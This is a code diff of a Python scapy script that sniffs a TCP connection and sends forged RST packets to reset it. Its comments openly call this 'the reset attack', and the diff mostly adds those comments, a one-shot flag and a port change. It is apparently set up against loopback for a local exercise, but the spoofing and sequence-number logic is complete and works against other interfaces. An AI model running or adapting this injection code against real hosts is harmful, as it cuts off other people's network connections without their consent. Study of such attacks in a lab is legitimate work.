@@ -5,7 +5,11 @@ from scapy.sendrecv import send
 
 DEFAULT_WINDOW_SIZE = 2052
 
+# If one shot is active, only send the attack once, even if it fails.
+one_shot = 1
 
+
+# Logging for grabbed packets
 def log(msg, params=None):
     if params is None:
         params = {}
@@ -13,6 +17,7 @@ def log(msg, params=None):
     print(f'{msg} {formatted_params}')
 
 
+# Check if TCP connection is available
 def is_packet_on_tcp_conn(server_ip, server_port, client_ip):
     def f(p):
         return is_packet_tcp_server_to_client(server_ip, server_port, client_ip)(p) or \
@@ -20,6 +25,7 @@ def is_packet_on_tcp_conn(server_ip, server_port, client_ip):
     return f
 
 
+# Check if the packet is server to client
 def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):
     def f(p):
         if not p.haslayer(TCP):
@@ -33,6 +39,7 @@ def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):
     return f
 
 
+# Check if packet is client to server
 def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
     def f(p):
         if not p.haslayer(TCP):
@@ -46,6 +53,7 @@ def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
     return f
 
 
+# Send the reset attack
 def send_reset(iface, ignore_syn=True):
     def f(p):
         src_ip = p[IP].src
@@ -56,6 +64,7 @@ def send_reset(iface, ignore_syn=True):
         ack = p[TCP].ack
         flags = p[TCP].flags
 
+        # Log the grabbed packet
         log(
             'Grabbed packet',
             {
@@ -68,14 +77,19 @@ def send_reset(iface, ignore_syn=True):
             }
         )
 
+        # If the packet is a SYN, ignore it
+        # Sending the RST here will not work
         if 'S' in flags and ignore_syn:
             print('Packet has SYN flag, not sending RST')
             return
 
+        # Set the sequence number of the RST packet to the received ACK
         rst_seq = ack
+        # Format the packet
         p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags='R', window=DEFAULT_WINDOW_SIZE,
                                              seq=rst_seq)
 
+        # Log the attack
         log(
             'Sending RST packet...',
             {
@@ -84,21 +98,31 @@ def send_reset(iface, ignore_syn=True):
             },
         )
 
+        # Send the attack
         send(p, verbose=0, iface=iface)
-        exit(0)
+
+        if one_shot:
+            exit(0)
     return f
 
 
+# Show the logged packet
 def log_packet(p):
     p.show()
     return p.show()
 
 
+# Run main
+# Interface name should be the loopback adapter or whatever interface is used
+# We can use Wireshark to find the exact interface name of the device
+# Localhost ip is currently set to default, which will be the same for the server/client
+# Server port needs to be the same as the port that the server/client is operating on
 if __name__ == '__main__':
     iface = '\\Device\\NPF_Loopback'
     localhost_ip = '127.0.0.1'
-    localhost_server_port = 8000
+    localhost_server_port = 12345
 
+    # Try to sniff a packet
     log('Starting sniff...')
     try:
         t = scapy.sniff(
@@ -108,5 +132,6 @@ if __name__ == '__main__':
             prn=send_reset(iface),
             # prn=log_packet,
             lfilter=is_packet_tcp_client_to_server(localhost_ip, localhost_server_port, localhost_ip))
+    # If timed out (returns IndexError), finish sniffing.
     except IndexError:
         log('Finished sniffing!')
